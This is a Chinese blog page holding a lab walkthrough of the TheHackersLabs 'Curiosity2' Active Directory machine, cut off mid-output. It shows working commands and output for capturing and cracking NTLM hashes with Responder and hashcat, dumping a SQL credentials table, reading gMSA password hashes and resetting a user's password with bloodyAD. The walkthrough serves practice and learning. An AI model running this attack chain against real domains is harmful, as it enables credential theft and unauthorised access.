<!DOCTYPE html><html lang="zh-CN"><head><meta charSet="utf-8" data-next-head=""/><meta charSet="utf-8"/><meta name="viewport" content="width=device-width, initial-scale=1.0" data-next-head=""/><meta name="robots" content="index,follow" data-next-head=""/><meta name="description" content="Sunset的个人博客" data-next-head=""/><meta name="twitter:card" content="summary_large_image" data-next-head=""/><meta name="twitter:site" content="@sunset" data-next-head=""/><meta name="twitter:creator" content="@sunset" data-next-head=""/><meta property="og:title" content="Sunset Blog" data-next-head=""/><meta property="og:description" content="Sunset的个人博客" data-next-head=""/><meta property="og:url" content="https://sunsetaction.top" data-next-head=""/><meta property="og:type" content="website" data-next-head=""/><meta property="og:image" content="https://sunsetaction.top/images/logo.png" data-next-head=""/><meta property="og:image:alt" content="Sunset Blog" data-next-head=""/><meta property="og:image:width" content="1200" data-next-head=""/><meta property="og:image:height" content="630" data-next-head=""/><meta property="og:locale" content="zh_CN" data-next-head=""/><meta property="og:site_name" content="Sunset Blog" data-next-head=""/><link rel="canonical" href="https://sunsetaction.top" data-next-head=""/><meta property="dc:creator" content="Sunset" data-next-head=""/><meta name="application-name" content="Sunset Blog" data-next-head=""/><link rel="icon" href="/images/Logo.ico" data-next-head=""/><title data-next-head="">重定向中...</title><meta name="description" content="Sunset的个人博客 - 记录生活和学习的点滴"/><meta name="keywords" content="sunset, blog, 技术博客, 编程, 个人网站"/><meta name="author" content="Sunset"/><link rel="canonical" href="https://sunsetaction.top"/><meta property="og:title" content="Sunset&#x27;s Blog"/><meta property="og:description" content="记录生活和学习的点滴"/><meta property="og:url" content="https://sunsetaction.top"/><meta property="og:type" content="website"/><link rel="preload" href="/_next/static/css/1313794ff57095ab.css" as="style"/><link rel="stylesheet" href="/_next/static/css/1313794ff57095ab.css" data-n-g=""/><noscript data-n-css=""></noscript><script defer="" noModule="" src="/_next/static/chunks/polyfills-42372ed130431b0a.js"></script><script src="/_next/static/chunks/webpack-0d12d6e4400a07d7.js" defer=""></script><script src="/_next/static/chunks/framework-2f335d22a7318891.js" defer=""></script><script src="/_next/static/chunks/main-57af89c0b17dff61.js" defer=""></script><script src="/_next/static/chunks/pages/_app-603a6856ad27351b.js" defer=""></script><script src="/_next/static/chunks/669-a48a697ea8aebbc4.js" defer=""></script><script src="/_next/static/chunks/pages/posts/%5Bid%5D-6fbfdb3e812309fb.js" defer=""></script><script src="/_next/static/nq5t09qnH8ePVEpcyZyT3/_buildManifest.js" defer=""></script><script src="/_next/static/nq5t09qnH8ePVEpcyZyT3/_ssgManifest.js" defer=""></script></head><body><div id="__next"><div class="w-full" style="opacity:0;transform:translateY(20px)"><div class="text-gray-700 dark:text-gray-300 flex flex-col min-h-screen font-[LXGWWenKai] bg-[#fafafa] dark:bg-[#1f2022] transition-colors duration-300"><div class="flex flex-col items-center justify-center"><header class="flex justify-center md:mt-12 mt-5"><div><div class="flex items-center justify-center md:justify-start"><h1 class="md:text-3xl text-xl font-extrabold text-red-700 dark:text-red-400 ml-4">Sunset&#x27;s Blog</h1></div><div class="mt-2 grid grid-cols-4"><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap text-sm font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-3 has-[&gt;svg]:px-2.5"><a href="/">Home</a></button><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap text-sm font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-3 has-[&gt;svg]:px-2.5"><a href="/writing/">Writing</a></button><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap text-sm font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-3 has-[&gt;svg]:px-2.5"><a href="/about/">About</a></button><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap text-sm font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-3 has-[&gt;svg]:px-2.5"><a href="/search/">Search</a></button></div></div></header></div><main class="flex justify-center flex-grow"><div class="w-full md:w-3xl mt-5 md:mt-15 text-center"><p>正在跳转到新地址...</p></div></main><footer class="w-full py-6 mt-12"><div class="max-w-4xl mx-auto px-4 text-center"><p class="text-sm text-gray-500 dark:text-gray-400">Copyright © <!-- -->2025<!-- --> Sunset.</p></div></footer></div></div></div><script id="__NEXT_DATA__" type="application/json">{"props":{"pageProps":{"postData":{"id":"TheHackersLabsCuriosity2","contentHtml":"\u003ch1\u003eCuriosity2\u003c/h1\u003e\n\u003cblockquote\u003e\n\u003cp\u003e\u003ca href=\"https://labs.thehackerslabs.com/machine/103\"\u003ehttps://labs.thehackerslabs.com/machine/103\u003c/a\u003e\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/TheHackersLabsCuriosity2/image.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003ch2\u003eRecon\u003c/h2\u003e\n\u003ch3\u003ePortScan\u003c/h3\u003e\n\u003cp\u003e\u003ccode\u003enmap\u003c/code\u003e 端口扫描\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Curiosity2 nmap -sT -min-rate 10000 -p- 192.168.56.116 \nStarting Nmap 7.95 ( https://nmap.org ) at 2025-07-19 19:40 CST\nWarning: 192.168.56.116 giving up on port because retransmission \u003cspan class=\"hljs-built_in\"\u003ecap\u003c/span\u003e hit (10).\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e 192.168.56.116\nHost is up (0.00030s latency).\nNot shown: 64872 closed tcp ports (conn-refused), 638 filtered tcp ports (no-response)\nPORT      STATE SERVICE\n53/tcp    open  domain\n88/tcp    open  kerberos-sec\n135/tcp   open  msrpc\n139/tcp   open  netbios-ssn\n389/tcp   open  ldap\n445/tcp   open  microsoft-ds\n464/tcp   open  kpasswd5\n593/tcp   open  http-rpc-epmap\n636/tcp   open  ldapssl\n3268/tcp  open  globalcatLDAP\n3269/tcp  open  globalcatLDAPssl\n5985/tcp  open  wsman\n9389/tcp  open  adws\n47001/tcp open  winrm\n49664/tcp open  unknown\n49665/tcp open  unknown\n49666/tcp open  unknown\n49667/tcp open  unknown\n49684/tcp open  unknown\n49685/tcp open  unknown\n49689/tcp open  unknown\n49693/tcp open  unknown\n49704/tcp open  unknown\n57936/tcp open  unknown\n60031/tcp open  unknown\nMAC Address: 08:00:27:06:86:F8 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Curiosity2 nmap -sT -A -p $(\u003cspan class=\"hljs-built_in\"\u003ecat\u003c/span\u003e port | awk -F \u003cspan class=\"hljs-string\"\u003e'/'\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e'{print $1}'\u003c/span\u003e | \u003cspan class=\"hljs-built_in\"\u003epaste\u003c/span\u003e -sd \u003cspan class=\"hljs-string\"\u003e','\u003c/span\u003e) 192.168.56.116\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-07-19 19:41 CST\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e 192.168.56.116\nHost is up (0.00086s latency).\n\nPORT      STATE SERVICE       VERSION\n53/tcp    open  domain        Simple DNS Plus\n88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server \u003cspan class=\"hljs-keyword\"\u003etime\u003c/span\u003e: 2025-07-19 11:41:37Z)\n135/tcp   open  msrpc         Microsoft Windows RPC\n139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn\n389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: cons.thl, Site: Default-First-Site-Name)\n| ssl-cert: Subject: commonName=WIN-C73PROQLRHL.cons.thl\n| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:\u0026#x3C;unsupported\u003e, DNS:WIN-C73PROQLRHL.cons.thl\n| Not valid before: 2024-10-11T16:05:23\n|_Not valid after:  2025-10-11T16:05:23\n|_ssl-\u003cspan class=\"hljs-built_in\"\u003edate\u003c/span\u003e: 2025-07-19T11:42:41+00:00; 0s from scanner \u003cspan class=\"hljs-keyword\"\u003etime\u003c/span\u003e.\n445/tcp   open  microsoft-ds?\n464/tcp   open  kpasswd5?\n593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0\n636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cons.thl, Site: Default-First-Site-Name)\n| ssl-cert: Subject: commonName=WIN-C73PROQLRHL.cons.thl\n| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:\u0026#x3C;unsupported\u003e, DNS:WIN-C73PROQLRHL.cons.thl\n| Not valid before: 2024-10-11T16:05:23\n|_Not valid after:  2025-10-11T16:05:23\n|_ssl-\u003cspan class=\"hljs-built_in\"\u003edate\u003c/span\u003e: 2025-07-19T11:42:41+00:00; 0s from scanner \u003cspan class=\"hljs-keyword\"\u003etime\u003c/span\u003e.\n3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: cons.thl, Site: Default-First-Site-Name)\n|_ssl-\u003cspan class=\"hljs-built_in\"\u003edate\u003c/span\u003e: 2025-07-19T11:42:41+00:00; 0s from scanner \u003cspan class=\"hljs-keyword\"\u003etime\u003c/span\u003e.\n| ssl-cert: Subject: commonName=WIN-C73PROQLRHL.cons.thl\n| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:\u0026#x3C;unsupported\u003e, DNS:WIN-C73PROQLRHL.cons.thl\n| Not valid before: 2024-10-11T16:05:23\n|_Not valid after:  2025-10-11T16:05:23\n3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cons.thl, Site: Default-First-Site-Name)\n| ssl-cert: Subject: commonName=WIN-C73PROQLRHL.cons.thl\n| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:\u0026#x3C;unsupported\u003e, DNS:WIN-C73PROQLRHL.cons.thl\n| Not valid before: 2024-10-11T16:05:23\n|_Not valid after:  2025-10-11T16:05:23\n|_ssl-\u003cspan class=\"hljs-built_in\"\u003edate\u003c/span\u003e: 2025-07-19T11:42:41+00:00; 0s from scanner \u003cspan class=\"hljs-keyword\"\u003etime\u003c/span\u003e.\n5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n|_http-server-header: Microsoft-HTTPAPI/2.0\n|_http-title: Not Found\n9389/tcp  open  mc-nmf        .NET Message Framing\n47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n|_http-title: Not Found\n|_http-server-header: Microsoft-HTTPAPI/2.0\n49664/tcp open  msrpc         Microsoft Windows RPC\n49665/tcp open  msrpc         Microsoft Windows RPC\n49666/tcp open  msrpc         Microsoft Windows RPC\n49667/tcp open  msrpc         Microsoft Windows RPC\n49684/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0\n49685/tcp open  msrpc         Microsoft Windows RPC\n49689/tcp open  msrpc         Microsoft Windows RPC\n49693/tcp open  msrpc         Microsoft Windows RPC\n49704/tcp open  msrpc         Microsoft Windows RPC\n57936/tcp open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM\n| ms-sql-info:\n|   192.168.56.116\\SQLEXPRESS:\n|     Instance name: SQLEXPRESS\n|     Version:\n|       name: Microsoft SQL Server 2019 RTM\n|       number: 15.00.2000.00\n|       Product: Microsoft SQL Server 2019\n|       Service pack level: RTM\n|       Post-SP patches applied: \u003cspan class=\"hljs-literal\"\u003efalse\u003c/span\u003e\n|     TCP port: 57936\n|_    Clustered: \u003cspan class=\"hljs-literal\"\u003efalse\u003c/span\u003e\n|_ssl-\u003cspan class=\"hljs-built_in\"\u003edate\u003c/span\u003e: 2025-07-19T11:42:41+00:00; 0s from scanner \u003cspan class=\"hljs-keyword\"\u003etime\u003c/span\u003e.\n| ms-sql-ntlm-info:\n|   192.168.56.116\\SQLEXPRESS:\n|     Target_Name: CONS\n|     NetBIOS_Domain_Name: CONS\n|     NetBIOS_Computer_Name: WIN-C73PROQLRHL\n|     DNS_Domain_Name: cons.thl\n|     DNS_Computer_Name: WIN-C73PROQLRHL.cons.thl\n|_    Product_Version: 10.0.14393\n| ssl-cert: Subject: commonName=WIN-C73PROQLRHL.cons.thl\n| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:\u0026#x3C;unsupported\u003e, DNS:WIN-C73PROQLRHL.cons.thl\n| Not valid before: 2024-10-11T16:05:23\n|_Not valid after:  2025-10-11T16:05:23\n60031/tcp open  msrpc         Microsoft Windows RPC\nMAC Address: 08:00:27:06:86:F8 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nDevice \u003cspan class=\"hljs-built_in\"\u003etype\u003c/span\u003e: general purpose\nRunning: Microsoft Windows 2016|2019\nOS CPE: cpe:/o:microsoft:windows_server_2016 cpe:/o:microsoft:windows_server_2019\nOS details: Microsoft Windows Server 2016 or Server 2019\nNetwork Distance: 1 hop\nService Info: Host: WIN-C73PROQLRHL; OS: Windows; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n| smb2-time:\n|   \u003cspan class=\"hljs-built_in\"\u003edate\u003c/span\u003e: 2025-07-19T11:42:32\n|_  start_date: 2025-07-19T18:29:12\n|_nbstat: NetBIOS name: WIN-C73PROQLRHL, NetBIOS user: \u0026#x3C;unknown\u003e, NetBIOS MAC: 08:00:27:06:86:f8 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n| smb2-security-mode:\n|   3:1:1:\n|_    Message signing enabled and required\n\nTRACEROUTE\nHOP RTT     ADDRESS\n1   0.86 ms 192.168.56.116\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap \u003cspan class=\"hljs-keyword\"\u003edone\u003c/span\u003e: 1 IP address (1 host up) scanned \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e 83.59 seconds\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch3\u003e枚举测试\u003c/h3\u003e\n\u003cp\u003e测试 \u003ccode\u003eSMB\u003c/code\u003e 匿名账户\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Curiosity2 nxc smb cons.thl -u anonymous -p \u003cspan class=\"hljs-string\"\u003e''\u003c/span\u003e                                                             \nSMB         192.168.56.116  445    WIN-C73PROQLRHL  [*] Windows 10 / Server 2016 Build 14393 x64 (name:WIN-C73PROQLRHL) (domain:cons.thl) (signing:True) (SMBv1:False) \nSMB         192.168.56.116  445    WIN-C73PROQLRHL  [-] cons.thl\\anonymous: STATUS_LOGON_FAILURE \n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e再看一眼 \u003ccode\u003ewireshark\u003c/code\u003e ，依旧有 \u003ccode\u003eLLMNR\u003c/code\u003e包，并且从数据包可以看出来是在查询 \u003ccode\u003eSQLserver\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/TheHackersLabsCuriosity2/image1.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003ch3\u003eResponder\u003c/h3\u003e\n\u003cp\u003e我们开启 \u003ccode\u003eResponder\u003c/code\u003e 不一会就就能抓到 \u003ccode\u003eHASH\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/TheHackersLabsCuriosity2/image2.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e开局的思路和\u003ccode\u003eCuriosity\u003c/code\u003e差不多\u003c/p\u003e\n\u003cp\u003e我们尝试将\u003ccode\u003eHASH\u003c/code\u003e进行爆破\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003ehashcat -m 5600 \u003cspan class=\"hljs-built_in\"\u003ehash\u003c/span\u003e /usr/share/seclists/Passwords/seasons.txt\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e得到密码\u003ccode\u003eau7umn@\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/TheHackersLabsCuriosity2/image3.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e测试凭据\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Curiosity2 nxc smb cons.thl -u sqldb -p \u003cspan class=\"hljs-string\"\u003e'au7umn@'\u003c/span\u003e\nSMB         192.168.56.116  445    WIN-C73PROQLRHL  [*] Windows 10 / Server 2016 Build 14393 x64 (name:WIN-C73PROQLRHL) (domain:cons.thl) (signing:True) (SMBv1:False) \nSMB         192.168.56.116  445    WIN-C73PROQLRHL  [+] cons.thl\\sqldb:au7umn@ \n\n➜  Curiosity2 nxc ldap cons.thl -u sqldb -p \u003cspan class=\"hljs-string\"\u003e'au7umn@'\u003c/span\u003e\nLDAP        192.168.56.116  389    WIN-C73PROQLRHL  [*] Windows 10 / Server 2016 Build 14393 (name:WIN-C73PROQLRHL) (domain:cons.thl)\nLDAP        192.168.56.116  389    WIN-C73PROQLRHL  [+] cons.thl\\sqldb:au7umn@ \n\n➜  Curiosity2 nxc winrm cons.thl -u sqldb -p \u003cspan class=\"hljs-string\"\u003e'au7umn@'\u003c/span\u003e\nWINRM       192.168.56.116  5985   WIN-C73PROQLRHL  [*] Windows 10 / Server 2016 Build 14393 (name:WIN-C73PROQLRHL) (domain:cons.thl)\n  arc4 = algorithms.ARC4(self._key)\nWINRM       192.168.56.116  5985   WIN-C73PROQLRHL  [+] cons.thl\\sqldb:au7umn@ (Pwn3d!)\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch2\u003e脱库\u003c/h2\u003e\n\u003cp\u003e根据用户名，该用户应该是对数据库有一定权限\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e*Evil-WinRM* PS C:\\Users\\sqldb\\DEsktop\u003e sqlcmd -S \u003cspan class=\"hljs-string\"\u003e\"localhost\\SQLEXPRESS\"\u003c/span\u003e -Q \u003cspan class=\"hljs-string\"\u003e\"SELECT @@VERSION\"\u003c/span\u003e\n\n------------------------------------------------------------------------------\nMicrosoft SQL Server 2019 (RTM) - 15.0.2000.5 (X64)\n        Sep 24 2019 13:48:23\n        Copyright (C) 2019 Microsoft Corporation\n        Express Edition (64-bit) on Windows Server 2016 Datacenter 10.0 \u0026#x3C;X64\u003e (Build 14393: ) (Hypervisor)\n\n(1 rows affected)\n\n*Evil-WinRM* PS C:\\Users\\sqldb\\DEsktop\u003e sqlcmd -S \u003cspan class=\"hljs-string\"\u003e\"localhost\\SQLEXPRESS\"\u003c/span\u003e -Q \u003cspan class=\"hljs-string\"\u003e\"SELECT name FROM sys.databases\"\u003c/span\u003e\nname\n--------------------------------------------------------------------------------------------------------------------------------\nmaster\ntempdb\nmodel\nmsdb\nCredentialsDB\ntoolsdb\n\n(6 rows affected)\n\n*Evil-WinRM* PS C:\\Users\\sqldb\\DEsktop\u003e sqlcmd -S \u003cspan class=\"hljs-string\"\u003e\"localhost\\SQLEXPRESS\"\u003c/span\u003e -Q \u003cspan class=\"hljs-string\"\u003e\"USE CredentialsDB;SELECT name FROM sys.tables\"\u003c/span\u003e\nChanged database context to \u003cspan class=\"hljs-string\"\u003e'CredentialsDB'\u003c/span\u003e.\nname\n--------------------------------------------------------------------------------------------------------------------------------\nCredentials\n\n(1 rows affected)\n\n*Evil-WinRM* PS C:\\Users\\sqldb\\DEsktop\u003e sqlcmd -S \u003cspan class=\"hljs-string\"\u003e\"localhost\\SQLEXPRESS\"\u003c/span\u003e -Q \u003cspan class=\"hljs-string\"\u003e\"USE CredentialsDB;SELECT * FROM Credentials\"\u003c/span\u003e\nChanged database context to \u003cspan class=\"hljs-string\"\u003e'CredentialsDB'\u003c/span\u003e.\nID          Username                                           Password\n----------- -------------------------------------------------- -------------------------------------------------------------\n          1 sqlsvc                                             a6d888301de7aa3b380a691d32837627\n\n(1 rows affected)\n\n*Evil-WinRM* PS C:\\Users\\sqldb\\DEsktop\u003e sqlcmd -S \u003cspan class=\"hljs-string\"\u003e\"localhost\\SQLEXPRESS\"\u003c/span\u003e -Q \u003cspan class=\"hljs-string\"\u003e\"USE toolsdb;SELECT name FROM sys.tables\"\u003c/span\u003e\nMsg 916, Level 14, State 2, Server WIN-C73PROQLRHL\\SQLEXPRESS, Line 1\nThe server principal \u003cspan class=\"hljs-string\"\u003e\"CONS\\sqldb\"\u003c/span\u003e is not able to access the database \u003cspan class=\"hljs-string\"\u003e\"toolsdb\"\u003c/span\u003e under the current security context.\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e拿到 \u003ccode\u003esqlsvc\u003c/code\u003e 的密码\u003ccode\u003eMD5\u003c/code\u003e值，拿去破解，还可以发现\u003c/p\u003e\n\u003cp\u003e得到密码 \u003ccode\u003e$PRING2021#\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Curiosity2 john --wordlist=/usr/share/seclists/Passwords/seasons.txt --format=Raw-MD5 \u003cspan class=\"hljs-built_in\"\u003ehash\u003c/span\u003e\nUsing default input encoding: UTF-8\nLoaded 1 password \u003cspan class=\"hljs-built_in\"\u003ehash\u003c/span\u003e (Raw-MD5 [MD5 256/256 AVX2 8x3])\nWarning: no OpenMP support \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e this \u003cspan class=\"hljs-built_in\"\u003ehash\u003c/span\u003e \u003cspan class=\"hljs-built_in\"\u003etype\u003c/span\u003e, consider --fork=8\nPress \u003cspan class=\"hljs-string\"\u003e'q'\u003c/span\u003e or Ctrl-C to abort, almost any other key \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e status\n\u003cspan class=\"hljs-variable\"\u003e$PRING2021\u003c/span\u003e#      (?)     \n1g 0:00:00:00 DONE (2025-07-19 20:11) 50.00g/s 19200p/s 19200c/s 19200C/s \u003cspan class=\"hljs-variable\"\u003e$pr1ng\u003c/span\u003e..\u003cspan class=\"hljs-variable\"\u003e$umm3r2021\u003c/span\u003e%\nUse the \u003cspan class=\"hljs-string\"\u003e\"--show --format=Raw-MD5\"\u003c/span\u003e options to display all of the cracked passwords reliably\nSession completed.\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e测试\u003ccode\u003esqlsvc\u003c/code\u003e的凭据\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Curiosity2 nxc winrm cons.thl -u sqlsvc -p \u003cspan class=\"hljs-string\"\u003e'$PRING2021#'\u003c/span\u003e\nWINRM       192.168.56.116  5985   WIN-C73PROQLRHL  [*] Windows 10 / Server 2016 Build 14393 (name:WIN-C73PROQLRHL) (domain:cons.thl)\n  arc4 = algorithms.ARC4(self._key)\nWINRM       192.168.56.116  5985   WIN-C73PROQLRHL  [+] cons.thl\\sqlsvc:\u003cspan class=\"hljs-variable\"\u003e$PRING2021\u003c/span\u003e# (Pwn3d!)\n➜  Curiosity2 nxc ldap cons.thl -u sqlsvc -p \u003cspan class=\"hljs-string\"\u003e'$PRING2021#'\u003c/span\u003e\nLDAP        192.168.56.116  389    WIN-C73PROQLRHL  [*] Windows 10 / Server 2016 Build 14393 (name:WIN-C73PROQLRHL) (domain:cons.thl)\nLDAP        192.168.56.116  389    WIN-C73PROQLRHL  [+] cons.thl\\sqlsvc:\u003cspan class=\"hljs-variable\"\u003e$PRING2021\u003c/span\u003e# \n➜  Curiosity2 nxc smb cons.thl -u sqlsvc -p \u003cspan class=\"hljs-string\"\u003e'$PRING2021#'\u003c/span\u003e\nSMB         192.168.56.116  445    WIN-C73PROQLRHL  [*] Windows 10 / Server 2016 Build 14393 x64 (name:WIN-C73PROQLRHL) (domain:cons.thl) (signing:True) (SMBv1:False) \nSMB         192.168.56.116  445    WIN-C73PROQLRHL  [+] cons.thl\\sqlsvc:\u003cspan class=\"hljs-variable\"\u003e$PRING2021\u003c/span\u003e#\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch2\u003eKeePass - 1\u003c/h2\u003e\n\u003cp\u003e使用\u003ccode\u003eWinRM\u003c/code\u003e登陆上去后，目录中有一个\u003ccode\u003eDatabase.kdbx\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e是\u003ccode\u003eKeePass\u003c/code\u003e的文件\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e*Evil-WinRM* PS C:\\Users\\sqlsvc\\Documents\u003e \u003cspan class=\"hljs-built_in\"\u003els\u003c/span\u003e\n\n    Directory: C:\\Users\\sqlsvc\\Documents\n\nMode                LastWriteTime         Length Name\n----                -------------         ------ ----\n-a----       10/31/2024   6:23 PM           2231 Database.kdbx\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e我们尝试一下使用\u003ccode\u003eKeePass\u003c/code\u003e 来打开，需要密码\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/TheHackersLabsCuriosity2/image4.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e没有密码，先放着\u003c/p\u003e\n\u003ch2\u003e横向移动\u003c/h2\u003e\n\u003ch3\u003e域分析\u003c/h3\u003e\n\u003cp\u003e上 \u003ccode\u003eBloodHound\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e用户很多，所以这里直接筛选了远程管理组（REMOTE MANAGMENT US）的用户\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/TheHackersLabsCuriosity2/image5.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e能发现 \u003ccode\u003eSQLSVC\u003c/code\u003e 能直接修改 \u003ccode\u003eGMSA_SQL\u003c/code\u003e的密码\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/TheHackersLabsCuriosity2/image6.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e然后 \u003ccode\u003eGMSA_SQL\u003c/code\u003e 还可以修改 \u003ccode\u003eTOOLSDB\u003c/code\u003e （上边有一个同名数据库，我们无权限访问）的密码\u003c/p\u003e\n\u003cp\u003e总结起来就是\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/TheHackersLabsCuriosity2/image7.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003ch3\u003eTo Toolsdb\u003c/h3\u003e\n\u003cp\u003e首先读取 \u003ccode\u003egMSA\u003c/code\u003e的密码\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  gMSADumper python gMSADumper.py -u sqlsvc -p \u003cspan class=\"hljs-string\"\u003e'$PRING2021#'\u003c/span\u003e -d cons.thl  \nUsers or \u003cspan class=\"hljs-built_in\"\u003egroups\u003c/span\u003e \u003cspan class=\"hljs-built_in\"\u003ewho\u003c/span\u003e can \u003cspan class=\"hljs-built_in\"\u003eread\u003c/span\u003e password \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e GMSA_SQL$:\n \u003e Svc_Accounts\nGMSA_SQL$:::0960ee1575670e65d189eb6e685713ca\nGMSA_SQL$:aes256-cts-hmac-sha1-96:ba95bac751b094ed71a42fcb7c4c1b34c5bdea75e47054744fa5b11863be0ea0\nGMSA_SQL$:aes128-cts-hmac-sha1-96:e74d4f008426bf3fe930d12485d3f212\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e再通过 \u003ccode\u003eGMSA_SQL\u003c/code\u003e 修改 \u003ccode\u003eTOOLSDB\u003c/code\u003e 的密码\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Curiosity2 bloodyAD -d \u003cspan class=\"hljs-string\"\u003e'cons.thl'\u003c/span\u003e -u \u003cspan class=\"hljs-string\"\u003e'GMSA_SQL$'\u003c/span\u003e -p :0960ee1575670e65d189eb6e685713ca --dc-ip 192.168.56.116 \u003cspan class=\"hljs-built_in\"\u003eset\u003c/span\u003e password \u003cspan class=\"hljs-string\"\u003e'TOOLSDB'\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e'Password@123'\u003c/span\u003e\n[+] Password changed 